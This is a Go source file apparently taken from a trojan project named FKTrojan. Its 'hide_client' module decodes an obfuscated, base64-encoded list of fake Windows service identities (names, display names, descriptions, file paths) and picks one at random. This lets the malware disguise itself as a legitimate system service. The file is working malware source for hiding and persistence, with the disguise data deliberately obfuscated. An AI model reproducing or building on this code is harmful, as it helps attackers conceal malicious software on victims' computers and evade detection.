package hide_client

import (
	"FKTrojan/common"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"time"
)

type ServiceInfo struct {
	Name        string   `json:"name"`
	DisplayName string   `json:"display_name`
	Desc        string   `json:"desc"`
	Path        string   `json:"path"`
	Args        []string `json:"args"`
	Version     string   `json:"version,omitempty"`
}

var (
	ServiceInfos []ServiceInfo
	VERSION      = "2018-03-27-001"
	// serviceInfoStr的生成参见TestGetSIsString函数
	serviceInfoStr = "XxphfxphJDKvZX2mJkphJnWpR3:veIKwcDJtDjBhJlSqd4CtZYmPZX2mJkphJmeqcnSwe4NhUXWlbXFhR3WveHWzJFOwcoSzc3yt[YJhV3Wzenmk[TJtDjBhJnSmd3NjPjBj6[zpJGeqcnSwe4NhUXWlbXFhR3WveHWzJPT5sfbPq,XJuvX:mfXJuvfVufjoivjLhvfcsjJtDjBhJoCieHhjPjBjR{qdYGeqcnSwe4OdYHWpc32mYGymbHOwcoSzc3xv[YimJjxLJDBjZYKodzJ7JGueMBphJDK3[YK{bX:vJkphJkJxNUhuNENuNkduNEByJhphgTxLJItLJDBjcnGu[TJ7JDKmbFOwcHymZ4SwdjJtDjBhJlSqd4CtZYmPZX2mJkphJmeqcnSwe4NhUXWlbXFhR3WveHWzJFOwcHymZ4SwdjCU[YK3bXOmJjxLJDBj[HW{ZzJ7JDMmoLhhW3mv[H:4dzCO[XSqZTCE[X61[YJh6Mju6qT37[vH6ZjH6q7R66T27LfH7JrD66vvJjxLJDBjdHG1bDJ7JDKEPmydW3mv[H:4d2yd[XiwcXWdYHWpZ3:tcHWkeH:zMnW5[TJtDjBhJnGz[4NjPjCcYTxLJDBjenWzd3mwcjJ7JDJzNEF5MUB{MUJ4MUBxNTJLJI1tDjC8DjBhJn6icXVjPjBj[XiOZX6i[3WzJjxLJDBjSHm{dHyifV6icXVjPjBjW3mv[H:4dzCO[XSqZTCE[X61[YJhUXGvZXemcXWveDCU[YK3bXOmJjxLJDBj[HW{ZzJ7JDMmoLhhW3mv[H:4dzCO[XSqZTCE[X61[YJh6Mju677i66DH66T27LfH7JrD66vvJjxLJDBjdHG1bDJ7JDKEPmydW3mv[H:4d2yd[XiwcXWdYHWpcXezMnW5[TJtDjBhJnGz[4NjPjCcYTxLJDBjenWzd3mwcjJ7JDJzNEF5MUB{MUJ4MUBxNTJLJI1LYR>>"
)

func init() {
	jsonStr := common.Base64Decode(common.Deobfuscate(serviceInfoStr))
	err := json.Unmarshal([]byte(jsonStr), &ServiceInfos)
	if err != nil {
		fmt.Printf("hide_client module init error %v\n", err)
		os.Exit(1)
	}
}
func randomSI() *ServiceInfo {
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	siLen := len(ServiceInfos)

	return &ServiceInfos[r1.Int()%siLen]
}
func (si *ServiceInfo) String() (string, error) {
	str, err := json.MarshalIndent(*si, "", " ")
	if err != nil {
		return "", err
	}
	return string(str), nil
}

func ParseSI(str string) (*ServiceInfo, error) {
	var si ServiceInfo
	err := json.Unmarshal([]byte(str), &si)
	if err != nil {
		return nil, err
	}
	return &si, nil
}
